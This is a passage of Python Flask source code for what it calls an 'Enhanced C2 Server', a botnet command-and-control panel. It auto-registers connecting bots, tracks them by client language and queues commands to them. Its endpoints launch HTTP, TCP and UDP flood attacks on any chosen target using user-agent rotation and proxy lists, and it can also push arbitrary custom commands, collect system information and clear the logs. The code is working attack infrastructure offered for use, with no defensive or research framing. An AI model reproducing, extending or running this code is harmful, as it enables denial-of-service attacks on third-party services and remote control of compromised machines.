        # Check OS - JavaScript/Node often reports different info
        os_info = str(specs.get('os', '')).lower()
        if 'node' in os_info or 'js' in os_info:
            return 'javascript'
        elif 'java' in os_info:
            return 'java'
        
        return 'unknown'
    except:
        return 'unknown'

@app.route('/check_approval', methods=['POST'])
def check_approval():
    """Auto-approve bots with client type detection"""
    try:
        data = request.json
        if not data:
            return jsonify({'approved': False, 'error': 'No data'}), 400
            
        bot_id = data.get('bot_id')
        specs = data.get('specs', {})
        
        if not bot_id:
            return jsonify({'approved': False, 'error': 'No bot_id'}), 400
        
        current_time = time.time()
        
        # Detect client type
        client_type = detect_client_type(specs)
        
        with bot_lock:
            if bot_id not in approved_bots:
                approved_bots[bot_id] = {
                    'specs': specs,
                    'last_seen': current_time,
                    'status': 'connected',
                    'approved_at': current_time,
                    'client_type': client_type,
                    'stats': data.get('stats', {}),
                    'commands_received': 0
                }
                
                log_message = f'Bot connected: {bot_id} - {client_type.upper()} client - {specs.get("os", "unknown")}'
                log_activity(log_message, 'success', client_type)
                print(f"[+] {log_message}")
            else:
                # Update last seen and client type
                approved_bots[bot_id]['last_seen'] = current_time
                approved_bots[bot_id]['client_type'] = client_type
                if approved_bots[bot_id].get('status') == 'disconnected':
                    approved_bots[bot_id]['status'] = 'reconnected'
                    log_message = f'Bot reconnected: {bot_id} - {client_type.upper()} client'
                    log_activity(log_message, 'success', client_type)
                    print(f"[+] {log_message}")
        
        return jsonify({'approved': True, 'client_type': client_type})
    except Exception as e:
        error_msg = f'Error in check_approval: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'approved': False, 'error': str(e)}), 500

@app.route('/commands/<bot_id>', methods=['GET'])
def get_commands(bot_id):
    """Get commands for specific bot"""
    try:
        with bot_lock:
            if bot_id in approved_bots:
                approved_bots[bot_id]['last_seen'] = time.time()
        
        with queue_lock:
            commands = commands_queue.get(bot_id, [])
            commands_queue[bot_id] = []  # Clear commands after sending
            
            # Update command count
            if bot_id in approved_bots and commands:
                approved_bots[bot_id]['commands_received'] = approved_bots[bot_id].get('commands_received', 0) + len(commands)
        
        return jsonify({'commands': commands})
    except Exception as e:
        error_msg = f'Error in get_commands for {bot_id}: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'commands': []}), 500

@app.route('/status', methods=['POST'])
def receive_status():
    """Receive status updates from bots"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': 'No data'}), 400
            
        bot_id = data.get('bot_id')
        status = data.get('status', 'unknown')
        message = data.get('message', '')
        
        with bot_lock:
            if bot_id in approved_bots:
                approved_bots[bot_id]['status'] = status
                approved_bots[bot_id]['last_seen'] = time.time()
                # Update stats if provided
                if 'stats' in data:
                    approved_bots[bot_id]['stats'] = data['stats']
        
        client_type = approved_bots.get(bot_id, {}).get('client_type', 'unknown')
        log_message = f"{bot_id} ({client_type}): {status} - {message}"
        log_activity(log_message, status, client_type)
        
        print(f"[*] Status from {bot_id} ({client_type}): {status} - {message}")
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        error_msg = f'Error in receive_status: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/user-agents', methods=['GET', 'POST'])
def manage_user_agents():
    """Manage user agents"""
    global user_agents
    
    try:
        if request.method == 'POST':
            data = request.json
            agents_text = data.get('user_agents', '')
            new_agents = [line.strip() for line in agents_text.split('\n') if line.strip()]
            
            if new_agents:
                user_agents = new_agents
                log_activity(f'Updated {len(user_agents)} user agents', 'info')
                print(f"[+] Updated {len(user_agents)} user agents")
                return jsonify({'status': 'success', 'message': f'Updated {len(user_agents)} user agents'})
            
            return jsonify({'status': 'error', 'message': 'No valid user agents provided'}), 400
        
        return jsonify({'user_agents': user_agents})
    except Exception as e:
        error_msg = f'Error in manage_user_agents: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/proxies', methods=['GET', 'POST'])
def manage_proxies():
    """Manage proxies"""
    global proxy_list
    
    try:
        if request.method == 'POST':
            data = request.json
            proxies_text = data.get('proxies', '')
            new_proxies = [line.strip() for line in proxies_text.split('\n') if line.strip()]
            
            proxy_list = new_proxies
            log_activity(f'Updated {len(proxy_list)} proxies', 'info')
            print(f"[+] Updated {len(proxy_list)} proxies")
            return jsonify({'status': 'success', 'message': f'Updated {len(proxy_list)} proxies'})
        
        return jsonify({'proxies': proxy_list})
    except Exception as e:
        error_msg = f'Error in manage_proxies: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/remove/<bot_id>', methods=['POST'])
def remove_bot(bot_id):
    """Remove specific bot"""
    try:
        with bot_lock:
            if bot_id in approved_bots:
                client_type = approved_bots[bot_id].get('client_type', 'unknown')
                del approved_bots[bot_id]
                
                with queue_lock:
                    if bot_id in commands_queue:
                        del commands_queue[bot_id]
                
                log_message = f'Bot removed: {bot_id} - {client_type.upper()} client'
                log_activity(log_message, 'error', client_type)
                print(f"[-] {log_message}")
                return jsonify({'status': 'success', 'message': f'Bot {bot_id} removed'})
        
        return jsonify({'status': 'error', 'message': 'Bot not found'}), 404
    except Exception as e:
        error_msg = f'Error in remove_bot: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/clear/inactive', methods=['POST'])
def clear_inactive_bots():
    """Clear inactive bots"""
    try:
        current_time = time.time()
        removed_count = 0
        
        with bot_lock:
            bots_to_remove = []
            for bot_id, info in list(approved_bots.items()):
                time_diff = current_time - info['last_seen']
                if time_diff > 300:  # 5 minutes
                    bots_to_remove.append(bot_id)
            
            for bot_id in bots_to_remove:
                client_type = approved_bots[bot_id].get('client_type', 'unknown')
                del approved_bots[bot_id]
                
                with queue_lock:
                    if bot_id in commands_queue:
                        del commands_queue[bot_id]
                
                removed_count += 1
                log_message = f'Removed inactive bot: {bot_id} - {client_type.upper()} client'
                log_activity(log_message, 'warning', client_type)
                print(f"[-] {log_message}")
        
        return jsonify({'status': 'success', 'message': f'Removed {removed_count} inactive bots'})
    except Exception as e:
        error_msg = f'Error in clear_inactive_bots: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    try:
        current_time = time.time()
        online_bots = 0
        java_clients = 0
        python_clients = 0
        javascript_clients = 0
        active_attacks = 0
        total_commands = 0
        
        with bot_lock:
            # Mark offline bots and count statistics
            for bot_id, info in list(approved_bots.items()):
                time_diff = current_time - info['last_seen']
                client_type = info.get('client_type', 'unknown')
                
                if time_diff < 30:
                    online_bots += 1
                    if info.get('status') == 'running':
                        active_attacks += 1
                    
                    # Count client types
                    if client_type == 'java':
                        java_clients += 1
                    elif client_type == 'python':
                        python_clients += 1
                    elif client_type == 'javascript':
                        javascript_clients += 1
                    
                    # Count total commands
                    total_commands += info.get('commands_received', 0)
                elif info.get('status') != 'offline':
                    info['status'] = 'offline'
        
        # Prepare approved list for display
        approved_list = []
        with bot_lock:
            for bot_id, info in approved_bots.items():
                is_online = (current_time - info['last_seen']) < 30
                approved_list.append({
                    'bot_id': bot_id,
                    'specs': info.get('specs', {}),
                    'status': info.get('status', 'unknown'),
                    'last_seen': time.strftime('%H:%M:%S', time.localtime(info['last_seen'])),
                    'online': is_online,
                    'client_type': info.get('client_type', 'unknown')
                })
        
        with log_lock:
            recent_logs = attack_logs[-50:]
        
        return jsonify({
            'approved_bots': len(approved_bots),
            'online_bots': online_bots,
            'java_clients': java_clients,
            'python_clients': python_clients,
            'javascript_clients': javascript_clients,
            'active_attacks': active_attacks,
            'total_commands': total_commands,
            'user_agents_count': len(user_agents),
            'approved': approved_list,
            'logs': recent_logs,
            'user_agents': user_agents,
            'proxies': proxy_list
        })
    except Exception as e:
        error_msg = f'Error in get_stats: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({
            'approved_bots': 0,
            'online_bots': 0,
            'java_clients': 0,
            'python_clients': 0,
            'javascript_clients': 0,
            'active_attacks': 0,
            'total_commands': 0,
            'user_agents_count': 0,
            'approved': [],
            'logs': [],
            'user_agents': [],
            'proxies': []
        }), 500

def filter_bots_by_client_type(client_type_filter: str) -> List[str]:
    """Filter bot IDs by client type"""
    current_time = time.time()
    filtered_bots = []
    
    with bot_lock:
        for bot_id, info in approved_bots.items():
            # Only include online bots
            if current_time - info['last_seen'] >= 30:
                continue
            
            bot_client_type = info.get('client_type', 'unknown')
            
            if client_type_filter == 'all':
                filtered_bots.append(bot_id)
            elif client_type_filter == 'java' and bot_client_type == 'java':
                filtered_bots.append(bot_id)
            elif client_type_filter == 'python' and bot_client_type == 'python':
                filtered_bots.append(bot_id)
            elif client_type_filter == 'javascript' and bot_client_type == 'javascript':
                filtered_bots.append(bot_id)
    
    return filtered_bots

@app.route('/api/attack/http', methods=['POST'])
def launch_http_attack():
    """Launch HTTP flood attack"""
    try:
        data = request.json
        
        target = data.get('target')
        duration = int(data.get('duration', 60))
        threads = int(data.get('threads', 100))
        method = data.get('method', 'GET')
        client_type_filter = data.get('client_type', 'all')
        
        if not target:
            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
        
        # Filter bots by client type
        target_bots = filter_bots_by_client_type(client_type_filter)
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available for the specified client type'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
                    'type': 'http_flood',
                    'target': target,
                    'duration': duration,
                    'threads': threads,  # EXACT thread count sent to client
                    'method': method,
                    'user_agents': user_agents,
                    'proxies': proxy_list
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
        log_message = f'HTTP {method} flood to {sent_count} bots ({client_type_display}) -> {target} ({threads} threads)'
        log_activity(log_message, 'warning', client_type_filter if client_type_filter != 'all' else None)
        
        print(f"[+] {log_message}")
        return jsonify({'status': 'success', 'message': f'HTTP flood sent to {sent_count} bots ({client_type_display})', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in launch_http_attack: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/attack/tcp', methods=['POST'])
def launch_tcp_attack():
    """Launch TCP flood attack"""
    try:
        data = request.json
        
        target = data.get('target')
        duration = int(data.get('duration', 60))
        threads = int(data.get('threads', 75))
        client_type_filter = data.get('client_type', 'all')
        
        if not target:
            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
        
        # Filter bots by client type
        target_bots = filter_bots_by_client_type(client_type_filter)
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available for the specified client type'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
                    'type': 'tcp_flood',
                    'target': target,
                    'duration': duration,
                    'threads': threads  # EXACT thread count sent to client
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
        log_message = f'TCP flood to {sent_count} bots ({client_type_display}) -> {target} ({threads} threads)'
        log_activity(log_message, 'warning', client_type_filter if client_type_filter != 'all' else None)
        
        print(f"[+] {log_message}")
        return jsonify({'status': 'success', 'message': f'TCP flood sent to {sent_count} bots ({client_type_display})', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in launch_tcp_attack: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/attack/udp', methods=['POST'])
def launch_udp_attack():
    """Launch UDP flood attack"""
    try:
        data = request.json
        
        target = data.get('target')
        duration = int(data.get('duration', 60))
        threads = int(data.get('threads', 75))
        client_type_filter = data.get('client_type', 'all')
        
        if not target:
            return jsonify({'status': 'error', 'message': 'No target specified'}), 400
        
        # Filter bots by client type
        target_bots = filter_bots_by_client_type(client_type_filter)
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available for the specified client type'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
                    'type': 'udp_flood',
                    'target': target,
                    'duration': duration,
                    'threads': threads  # EXACT thread count sent to client
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
        log_message = f'UDP flood to {sent_count} bots ({client_type_display}) -> {target} ({threads} threads)'
        log_activity(log_message, 'warning', client_type_filter if client_type_filter != 'all' else None)
        
        print(f"[+] {log_message}")
        return jsonify({'status': 'success', 'message': f'UDP flood sent to {sent_count} bots ({client_type_display})', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in launch_udp_attack: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/ping', methods=['POST'])
def send_ping():
    """Send ping to bots"""
    try:
        data = request.json
        client_type_filter = data.get('client_type', 'all') if data else 'all'
        
        target_bots = filter_bots_by_client_type(client_type_filter)
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {'type': 'ping'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
        log_activity(f'Ping sent to {sent_count} {client_type_display}', 'success')
        print(f"[+] Ping sent to {sent_count} {client_type_display}")
        return jsonify({'status': 'success', 'message': f'Ping sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in send_ping: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/sysinfo', methods=['POST'])
def send_sysinfo():
    """Request system info from bots"""
    try:
        data = request.json
        client_type_filter = data.get('client_type', 'all') if data else 'all'
        
        target_bots = filter_bots_by_client_type(client_type_filter)
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {'type': 'sysinfo'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
        log_activity(f'Sysinfo request sent to {sent_count} {client_type_display}', 'success')
        print(f"[+] Sysinfo sent to {sent_count} {client_type_display}")
        return jsonify({'status': 'success', 'message': f'Sysinfo request sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in send_sysinfo: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/stop', methods=['POST'])
def send_stop_all():
    """Stop all attacks on bots"""
    try:
        data = request.json
        client_type_filter = data.get('client_type', 'all') if data else 'all'
        
        target_bots = filter_bots_by_client_type(client_type_filter)
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {'type': 'stop_all'}
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
        log_activity(f'Stop all attacks command sent to {sent_count} {client_type_display}', 'error')
        print(f"[+] Stop command sent to {sent_count} {client_type_display}")
        return jsonify({'status': 'success', 'message': f'Stop command sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in send_stop_all: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/test', methods=['POST'])
def send_test_command():
    """Send test command to bots"""
    try:
        data = request.json
        
        target = data.get('target', 'https://httpbin.org/get')
        duration = int(data.get('duration', 10))
        threads = int(data.get('threads', 20))
        client_type_filter = data.get('client_type', 'all')
        
        target_bots = filter_bots_by_client_type(client_type_filter)
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                command = {
                    'type': 'http_flood',
                    'target': target,
                    'duration': duration,
                    'threads': threads,
                    'method': 'GET',
                    'user_agents': user_agents[:2],
                    'proxies': []
                }
                
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
        log_activity(f'Test command sent to {sent_count} {client_type_display} -> {target}', 'info')
        print(f"[+] Test command sent to {sent_count} {client_type_display}")
        return jsonify({'status': 'success', 'message': f'Test command sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in send_test_command: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/command/custom', methods=['POST'])
def send_custom_command():
    """Send custom command to bots"""
    try:
        data = request.json
        
        command = data.get('command')
        client_type_filter = data.get('client_type', 'all')
        
        if not command:
            return jsonify({'status': 'error', 'message': 'No command specified'}), 400
        
        target_bots = filter_bots_by_client_type(client_type_filter)
        
        if not target_bots:
            return jsonify({'status': 'error', 'message': 'No online bots available'}), 400
        
        sent_count = 0
        
        with queue_lock:
            for bot_id in target_bots:
                if bot_id not in commands_queue:
                    commands_queue[bot_id] = []
                commands_queue[bot_id].append(command)
                sent_count += 1
        
        client_type_display = 'all' if client_type_filter == 'all' else f'{client_type_filter} clients'
        log_activity(f'Custom command sent to {sent_count} {client_type_display}', 'info')
        print(f"[+] Custom command sent to {sent_count} {client_type_display}")
        return jsonify({'status': 'success', 'message': f'Custom command sent to {sent_count} {client_type_display}', 'sent_count': sent_count})
    except Exception as e:
        error_msg = f'Error in send_custom_command: {str(e)}'
        log_activity(error_msg, 'error')
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/logs/clear', methods=['POST'])
def clear_logs():
    """Clear all activity logs"""
    try:
        with log_lock:
            attack_logs.clear()
        log_activity('Activity logs cleared', 'warning')
        print(f"[+] Activity logs cleared")
        return jsonify({'status': 'success', 'message': 'Activity logs cleared'})
    except Exception as e:
        error_msg = f'Error in clear_logs: {str(e)}'
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/api/logs/export', methods=['GET'])
def export_logs():
    """Export logs as text file"""
    try:
        with log_lock:
            log_text = "C2 SERVER LOGS - MULTI-CLIENT SUPPORT\n"
            log_text += "=" * 60 + "\n\n"
            for log in attack_logs:
                client_type = log.get('client_type', '')
                client_info = f" [{client_type.upper()}]" if client_type else ""
                log_text += f"[{log['time']}]{client_info} {log['message']}\n"
        
        return Response(log_text, mimetype='text/plain')
    except Exception as e:
        error_msg = f'Error in export_logs: {str(e)}'
        print(f"[!] {error_msg}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def cleanup():
    """Cleanup on server shutdown"""
    print("\n[!] Server shutting down...")
    print(f"[+] Total bots connected: {len(approved_bots)}")
    print(f"[+] Total logs recorded: {len(attack_logs)}")
    print(f"[+] Client breakdown:")
    print(f"    Python: {sum(1 for b in approved_bots.values() if b.get('client_type') == 'python')}")
    print(f"    Java: {sum(1 for b in approved_bots.values() if b.get('client_type') == 'java')}")
    print(f"    JavaScript: {sum(1 for b in approved_bots.values() if b.get('client_type') == 'javascript')}")
    print("[+] Goodbye!")

if __name__ == '__main__':
    import sys
    
    print("\n" + "="*60)
    print("  ENHANCED C2 SERVER - MULTI-CLIENT SUPPORT")
    print("="*60)
    
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
    port = int(os.environ.get('PORT', port))
    
    print(f"[+] Starting server on port {port}")
    print(f"[+] Dashboard: http://0.0.0.0:{port}")
    print(f"[+] All bots will be auto-approved")
    print(f"[+] Client support: Python, Java, JavaScript")
    print(f"[+] Thread configuration: Server-defined -> Sent to clients")
    print(f"[+] User agents: {len(user_agents)} loaded")
    print(f"[+] Waiting for connections...\n")
    
    # Register cleanup function
    atexit.register(cleanup)
    
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
